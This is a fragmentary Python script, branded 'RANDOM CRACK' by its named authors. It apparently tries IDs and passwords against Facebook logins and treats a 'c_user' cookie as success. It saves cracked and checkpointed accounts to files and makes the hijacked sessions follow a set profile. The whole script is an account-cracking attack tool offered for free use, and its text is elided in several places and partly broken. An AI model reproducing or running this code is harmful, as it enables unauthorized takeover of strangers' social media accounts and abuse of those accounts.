...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100091814386647&mibextid=ZbWKwL{
...
██████████████████████████████████████████████████
 ┌─────────────────────────────────────────┐
 │ [✓] AUTHOR   :  MD SHAMIM MIZI + Md Jahidul Islam Joy   	      │
 │ [✓] TOOL     : RANDOM CRACK          													  │
 │ [✓] STATUS   : FREE                  														   	   │
 │ [✓] GITHUB   : blue X diamond      													 	  │
 │ [✓] FACEBOOK : MD SHAMIM MIZI       											     │
 └─────────────────────────────────────────┘""")
try:
...
def innocent():
    ...
    print('Ok Ids Saved in /SHAMIM-OK.txt')
    print('Cp Ids Saved in /SHAMIM-CP.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[SHAMIM-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[SHAMIM-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mSHAMIM\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
